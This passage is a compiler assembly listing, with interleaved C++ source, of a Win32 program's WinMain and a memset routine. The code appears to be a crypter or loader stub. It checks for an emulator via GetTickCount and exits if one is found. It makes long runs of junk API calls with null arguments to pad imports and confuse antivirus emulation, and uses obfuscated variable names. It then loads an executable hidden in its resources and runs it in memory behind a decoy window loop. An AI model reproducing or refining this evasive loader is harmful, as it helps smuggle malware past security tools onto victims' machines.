	mov	DWORD PTR _ecx_value$6[ebp], ecx

; 438  : 		}
; 439  : 
; 440  : 		func_0_2();

	call	?func_0_2@@YAPAUHDC__@@XZ		; func_0_2

; 441  : 		func_1_1(cHxOcRNyfwW, (LONG)0x5D6321E2);

	push	1566777826				; 5d6321e2H
	mov	ecx, DWORD PTR _cHxOcRNyfwW$[ebp]
	push	ecx
	call	?func_1_1@@YAPAUHMENU__@@PAUHDC__@@J@Z	; func_1_1
	add	esp, 8

; 442  : 
; 443  : 
; 444  : 		func_0_3();

	call	?func_0_3@@YAPAUHDC__@@XZ		; func_0_3

; 445  : 
; 446  : 		if (ecx_value != 0x103) {

	cmp	DWORD PTR _ecx_value$6[ebp], 259	; 00000103H
	je	$LN11@WinMain
$LN10@WinMain:

; 447  : 
; 448  : 
; 449  : 			while (ecx_value != 0x103) {

	cmp	DWORD PTR _ecx_value$6[ebp], 259	; 00000103H
	je	$LN11@WinMain

; 450  : 				GetLastError();

	call	DWORD PTR __imp__GetLastError@0

; 451  : 				FreeLibrary(0);

	push	0
	call	DWORD PTR __imp__FreeLibrary@4

; 452  : 				LocalFree(0);

	push	0
	call	DWORD PTR __imp__LocalFree@4

; 453  : 				MultiByteToWideChar(0, 0, 0, 0, 0, 0);

	push	0
	push	0
	push	0
	push	0
	push	0
	push	0
	call	DWORD PTR __imp__MultiByteToWideChar@24

; 454  : 				LeaveCriticalSection(0);

	push	0
	call	DWORD PTR __imp__LeaveCriticalSection@4

; 455  : 				EnterCriticalSection(0);

	push	0
	call	DWORD PTR __imp__EnterCriticalSection@4

; 456  : 				DeleteCriticalSection(0);

	push	0
	call	DWORD PTR __imp__DeleteCriticalSection@4

; 457  : 				InitializeCriticalSection(0);

	push	0
	call	DWORD PTR __imp__InitializeCriticalSection@4

; 458  : 				GetSystemTimeAsFileTime(0);

	push	0
	call	DWORD PTR __imp__GetSystemTimeAsFileTime@4

; 459  : 				UnhandledExceptionFilter(0);

	push	0
	call	DWORD PTR __imp__UnhandledExceptionFilter@4

; 460  : 				SetUnhandledExceptionFilter(0);

	push	0
	call	DWORD PTR __imp__SetUnhandledExceptionFilter@4

; 461  : 				WideCharToMultiByte(0, 0, 0, 0, 0, 0, 0, 0);

	push	0
	push	0
	push	0
	push	0
	push	0
	push	0
	push	0
	push	0
	call	DWORD PTR __imp__WideCharToMultiByte@32

; 462  : 				lstrlenW(0);

	push	0
	call	DWORD PTR __imp__lstrlenW@4

; 463  : 				LocalAlloc(0, 0);

	push	0
	push	0
	call	DWORD PTR __imp__LocalAlloc@8

; 464  : 				WaitForSingleObject(0, 0);

	push	0
	push	0
	call	DWORD PTR __imp__WaitForSingleObject@8

; 465  : 				HeapFree(0, 0, 0);

	push	0
	push	0
	push	0
	call	DWORD PTR __imp__HeapFree@12

; 466  : 				HeapAlloc(0, 0, 0);

	push	0
	push	0
	push	0
	call	DWORD PTR __imp__HeapAlloc@12

; 467  : 				lstrcpyW(0, 0);

	push	0
	push	0
	call	DWORD PTR __imp__lstrcpyW@8

; 468  : 				VirtualAlloc(0, 0, 0, 0);

	push	0
	push	0
	push	0
	push	0
	call	DWORD PTR __imp__VirtualAlloc@16

; 469  : 				VirtualFree(0, 0, 0);

	push	0
	push	0
	push	0
	call	DWORD PTR __imp__VirtualFree@12

; 470  : 				HeapReAlloc(0, 0, 0, 0);

	push	0
	push	0
	push	0
	push	0
	call	DWORD PTR __imp__HeapReAlloc@16

; 471  : 				GetFileSize(0, 0);

	push	0
	push	0
	call	DWORD PTR __imp__GetFileSize@8

; 472  : 				lstrcatW(0, 0);

	push	0
	push	0
	call	DWORD PTR __imp__lstrcatW@8

; 473  : 				GlobalLock(0);

	push	0
	call	DWORD PTR __imp__GlobalLock@4

; 474  : 				GlobalUnlock(0);

	push	0
	call	DWORD PTR __imp__GlobalUnlock@4

; 475  : 				FormatMessageW(0, 0, 0, 0, 0, 0, 0);

	push	0
	push	0
	push	0
	push	0
	push	0
	push	0
	push	0
	call	DWORD PTR __imp__FormatMessageW@28

; 476  : 				ReleaseMutex(0);

	push	0
	call	DWORD PTR __imp__ReleaseMutex@4

; 477  : 			}

	jmp	$LN10@WinMain
$LN11@WinMain:

; 478  : 		}
; 479  : 
; 480  : 		if (checkEmulator_GetTickCount()) {

	call	?checkEmulator_GetTickCount@@YA_NXZ	; checkEmulator_GetTickCount
	movzx	edx, al
	test	edx, edx
	je	SHORT $LN8@WinMain

; 481  : 			__asm{
; 482  : 				push 0

	push	0

; 483  : 					mov eax, lpExitProcess

	mov	eax, DWORD PTR _lpExitProcess$4[ebp]

; 484  : 					call eax

	call	eax
$LN8@WinMain:

; 485  : 			}
; 486  : 		}
; 487  : 
; 488  : 		func_1_1(cHxOcRNyfwW, (LONG)0x093ED88C);

	push	155113612				; 093ed88cH
	mov	eax, DWORD PTR _cHxOcRNyfwW$[ebp]
	push	eax
	call	?func_1_1@@YAPAUHMENU__@@PAUHDC__@@J@Z	; func_1_1
	add	esp, 8

; 489  : 		func_1_1((HDC)0x26046744, lhoN);

	mov	ecx, DWORD PTR _lhoN$[ebp]
	push	ecx
	push	637822788				; 26046744H
	call	?func_1_1@@YAPAUHMENU__@@PAUHDC__@@J@Z	; func_1_1
	add	esp, 8

; 490  : 
; 491  : 		func_0_1((HINSTANCE)0x37F57C34, L"4ZKApVFPtHz", (HMENU)0x68354BCF, eCOvAWndzGE, tcoGxIxPUl, (HMENU)0x6CB7F8FC);

	push	1823996156				; 6cb7f8fcH
	mov	edx, DWORD PTR _tcoGxIxPUl$[ebp]
	push	edx
	mov	eax, DWORD PTR _eCOvAWndzGE$[ebp]
	push	eax
	push	1748323279				; 68354bcfH
	push	OFFSET $SG53568
	push	938834996				; 37f57c34H
	call	?func_0_1@@YAPAXPAUHINSTANCE__@@PA_WPAUHMENU__@@0PAUHWND__@@2@Z ; func_0_1
	add	esp, 24					; 00000018H

; 492  : 
; 493  : 		for (size_t i = 0; i < 100; i++) {

	mov	DWORD PTR _i$5[ebp], 0
	jmp	SHORT $LN7@WinMain
$LN6@WinMain:
	mov	ecx, DWORD PTR _i$5[ebp]
	add	ecx, 1
	mov	DWORD PTR _i$5[ebp], ecx
$LN7@WinMain:
	cmp	DWORD PTR _i$5[ebp], 100		; 00000064H
	jae	SHORT $LN5@WinMain

; 494  : 			
; 495  : 			LocalAlloc(0, 5);

	push	5
	push	0
	call	DWORD PTR __imp__LocalAlloc@8

; 496  : 
; 497  : 			//__asm{ pushad }
; 498  : 			//emul_func_loop();
; 499  : 			//__asm { popad }
; 500  : 
; 501  : 			FreeLibrary(0);

	push	0
	call	DWORD PTR __imp__FreeLibrary@4

; 502  : 		/*	
; 503  : 			for (size_t x = 0; x < 500; x++) {
; 504  : 				
; 505  : 				__asm{ pushad }
; 506  : 				emul_func_loop();
; 507  : 				__asm { popad }
; 508  : 			}*/
; 509  : 		}

	jmp	SHORT $LN6@WinMain
$LN5@WinMain:

; 510  : 
; 511  : 
; 512  : 		lpExeBuffer = loader_load_res(&dwExeSize);

	lea	edx, DWORD PTR _dwExeSize$[ebp]
	push	edx
	call	?loader_load_res@@YAPAXPAK@Z		; loader_load_res
	add	esp, 4
	mov	DWORD PTR _lpExeBuffer$[ebp], eax

; 513  : 		loader_load_pe(lpExeBuffer, dwExeSize);

	mov	eax, DWORD PTR _dwExeSize$[ebp]
	push	eax
	mov	ecx, DWORD PTR _lpExeBuffer$[ebp]
	push	ecx
	call	?loader_load_pe@@YAXPAXK@Z		; loader_load_pe
	add	esp, 8

; 514  : 
; 515  : 		__asm{
; 516  : 			push 0

	push	0

; 517  : 				mov eax, lpExitProcess

	mov	eax, DWORD PTR _lpExitProcess$4[ebp]

; 518  : 				call eax

	call	eax
$LN13@WinMain:

; 519  : 		}
; 520  : 	}
; 521  : 
; 522  : 	//// Kernel32.dll
; 523  : 	/*GetLastError();
; 524  : 	FreeLibrary(0);
; 525  : 	LocalFree(0);
; 526  : 	MultiByteToWideChar(0, 0, 0, 0, 0, 0);
; 527  : 	LeaveCriticalSection(0);
; 528  : 	EnterCriticalSection(0);
; 529  : 	DeleteCriticalSection(0);
; 530  : 	InitializeCriticalSection(0);
; 531  : 	GetSystemTimeAsFileTime(0);
; 532  : 	UnhandledExceptionFilter(0);
; 533  : 	SetUnhandledExceptionFilter(0);
; 534  : 	WideCharToMultiByte(0, 0, 0, 0, 0, 0, 0, 0);
; 535  : 	lstrlenW(0);
; 536  : 	LocalAlloc(0, 0);
; 537  : 	WaitForSingleObject(0, 0);
; 538  : 	HeapFree(0, 0, 0);
; 539  : 	HeapAlloc(0, 0, 0);
; 540  : 	lstrcpyW(0, 0);
; 541  : 	VirtualAlloc(0, 0, 0, 0);
; 542  : 	VirtualFree(0, 0, 0);
; 543  : 	HeapReAlloc(0, 0, 0, 0);
; 544  : 	GetFileSize(0, 0);
; 545  : 	lstrcatW(0, 0);
; 546  : 	GlobalLock(0);
; 547  : 	GlobalUnlock(0);
; 548  : 	FormatMessageW(0, 0, 0, 0, 0, 0, 0);
; 549  : 	ReleaseMutex(0);
; 550  : */
; 551  : 
; 552  : 	// COMCTL32.dll
; 553  : 	InitCommonControls();

	call	DWORD PTR __imp__InitCommonControls@0

; 554  : 	CreatePropertySheetPage(NULL);

	push	0
	call	DWORD PTR __imp__CreatePropertySheetPageA@4

; 555  : 	PropertySheet(NULL);

	push	0
	call	DWORD PTR __imp__PropertySheetA@4

; 556  : 	ImageList_Create(NULL, NULL, NULL, NULL, NULL);

	push	0
	push	0
	push	0
	push	0
	push	0
	call	DWORD PTR __imp__ImageList_Create@20

; 557  : 	ImageList_ReplaceIcon(NULL, NULL, NULL);

	push	0
	push	0
	push	0
	call	DWORD PTR __imp__ImageList_ReplaceIcon@12

; 558  : 	/*ImageList_Destroy(NULL);
; 559  : 	PropertySheetA(NULL);
; 560  : 	PropertySheetW(NULL);
; 561  : 	ImageList_Draw(NULL, NULL, NULL, NULL, NULL, NULL);
; 562  : 	CreateToolbarEx(NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL, NULL);*/
; 563  : 	ImageList_LoadImageA(NULL, NULL, NULL, NULL, NULL, NULL, NULL);

	push	0
	push	0
	push	0
	push	0
	push	0
	push	0
	push	0
	call	DWORD PTR __imp__ImageList_LoadImageA@28

; 564  : 	ImageList_GetIconSize(NULL, NULL, NULL);

	push	0
	push	0
	push	0
	call	DWORD PTR __imp__ImageList_GetIconSize@12

; 565  : 
; 566  : 	//// USER32.dll
; 567  : 	wsprintf(NULL, NULL);

	push	0
	push	0
	call	DWORD PTR __imp__wsprintfA
	add	esp, 8

; 568  : 	GetDlgItem(NULL, NULL);

	push	0
	push	0
	call	DWORD PTR __imp__GetDlgItem@8

; 569  : 	ShowWindow(NULL, NULL);

	push	0
	push	0
	call	DWORD PTR __imp__ShowWindow@8

; 570  : 	EndDialog(NULL, NULL);

	push	0
	push	0
	call	DWORD PTR __imp__EndDialog@8

; 571  : 	GetWindowRect(NULL, NULL);

	push	0
	push	0
	call	DWORD PTR __imp__GetWindowRect@8

; 572  : 	//GetSysColor(NULL);
; 573  : 	//GetSysColorBrush(NULL);
; 574  : 	//GetWindowTextLength(NULL);
; 575  : 	//DrawFocusRect(NULL, NULL);
; 576  : 	//CreateDialogParamA(NULL, NULL, NULL, NULL, NULL);
; 577  : 	//SetDlgItemTextA(NULL, NULL, NULL);
; 578  : 	//CreatePopupMenu();
; 579  : 	//RedrawWindow(0, 0, 0, 0);
; 580  : 	LoadMenuW(0, 0);

	push	0
	push	0
	call	DWORD PTR __imp__LoadMenuW@8

; 581  : 	GetSystemDefaultLangID();

	call	DWORD PTR __imp__GetSystemDefaultLangID@0

; 582  : 	ExitWindowsEx(0, 0);

	push	0
	push	0
	call	DWORD PTR __imp__ExitWindowsEx@8

; 583  : 	GetWindowPlacement(0, 0);

	push	0
	push	0
	call	DWORD PTR __imp__GetWindowPlacement@8

; 584  : 	GetLastActivePopup(0);

	push	0
	call	DWORD PTR __imp__GetLastActivePopup@4

; 585  : 	GetClassName(0, 0, 0);

	push	0
	push	0
	push	0
	call	DWORD PTR __imp__GetClassNameA@12

; 586  : 
; 587  : 	// Perform application initialization:
; 588  : 	if (!InitInstance(hInstance, nCmdShow)) {

	mov	edx, DWORD PTR _nCmdShow$[ebp]
	push	edx
	mov	eax, DWORD PTR _hInstance$[ebp]
	push	eax
	call	?InitInstance@@YAHPAUHINSTANCE__@@H@Z	; InitInstance
	add	esp, 8
	test	eax, eax
	jne	SHORT $LN4@WinMain

; 589  : 		return FALSE;

	xor	eax, eax
	jmp	SHORT $LN20@WinMain
$LN4@WinMain:

; 590  : 	}
; 591  : 
; 592  : 	hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_WIN32PROJECT1));

	push	109					; 0000006dH
	mov	ecx, DWORD PTR _hInstance$[ebp]
	push	ecx
	call	DWORD PTR __imp__LoadAcceleratorsA@8
	mov	DWORD PTR _hAccelTable$[ebp], eax
$LN3@WinMain:

; 593  : 
; 594  : 	// Main message loop:
; 595  : 	while (GetMessage(&msg, NULL, 0, 0)) {

	push	0
	push	0
	push	0
	lea	edx, DWORD PTR _msg$[ebp]
	push	edx
	call	DWORD PTR __imp__GetMessageA@16
	test	eax, eax
	je	SHORT $LN2@WinMain

; 596  : 		if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg)) {

	lea	eax, DWORD PTR _msg$[ebp]
	push	eax
	mov	ecx, DWORD PTR _hAccelTable$[ebp]
	push	ecx
	mov	edx, DWORD PTR _msg$[ebp]
	push	edx
	call	DWORD PTR __imp__TranslateAcceleratorA@12
	test	eax, eax
	jne	SHORT $LN1@WinMain

; 597  : 			TranslateMessage(&msg);

	lea	eax, DWORD PTR _msg$[ebp]
	push	eax
	call	DWORD PTR __imp__TranslateMessage@4
$LN1@WinMain:

; 598  : 			//DispatchMessage(&msg);
; 599  : 		}
; 600  : 	}

	jmp	SHORT $LN3@WinMain
$LN2@WinMain:

; 601  : 
; 602  : 	return (int)msg.wParam;

	mov	eax, DWORD PTR _msg$[ebp+8]
$LN20@WinMain:

; 603  : }

	mov	esp, ebp
	pop	ebp
	ret	16					; 00000010H
_WinMain@16 ENDP
_TEXT	ENDS
; Function compile flags: /Odtp
; File c:\users\admin\documents\visual studio 2013\projects\win32project1\win32project1\peloader.h
_TEXT	SEGMENT
tv66 = -8						; size = 4
_p$ = -4						; size = 4
_pTarget$ = 8						; size = 4
_value$ = 12						; size = 4
_cbTarget$ = 16						; size = 4
_memset	PROC

; 9    : void * __cdecl memset(void *pTarget, int value, size_t cbTarget) {

	push	ebp
	mov	ebp, esp
	sub	esp, 8

; 10   : 	unsigned char *p = static_cast<unsigned char *>(pTarget);

	mov	eax, DWORD PTR _pTarget$[ebp]
	mov	DWORD PTR _p$[ebp], eax
$LN2@memset:

; 11   : 	while (cbTarget-- > 0) {

	mov	ecx, DWORD PTR _cbTarget$[ebp]
	mov	DWORD PTR tv66[ebp], ecx
	mov	edx, DWORD PTR _cbTarget$[ebp]
	sub	edx, 1
	mov	DWORD PTR _cbTarget$[ebp], edx
	cmp	DWORD PTR tv66[ebp], 0
	jbe	SHORT $LN1@memset

; 12   : 		*p++ = static_cast<unsigned char>(value);

	mov	eax, DWORD PTR _p$[ebp]
	mov	cl, BYTE PTR _value$[ebp]
	mov	BYTE PTR [eax], cl
	mov	edx, DWORD PTR _p$[ebp]
	add	edx, 1
	mov	DWORD PTR _p$[ebp], edx

; 13   : 	}

	jmp	SHORT $LN2@memset
$LN1@memset:

; 14   : 	return pTarget;

	mov	eax, DWORD PTR _pTarget$[ebp]

; 15   : }

	mov	esp, ebp
	pop	ebp
	ret	0
_memset	ENDP
_TEXT	ENDS
END
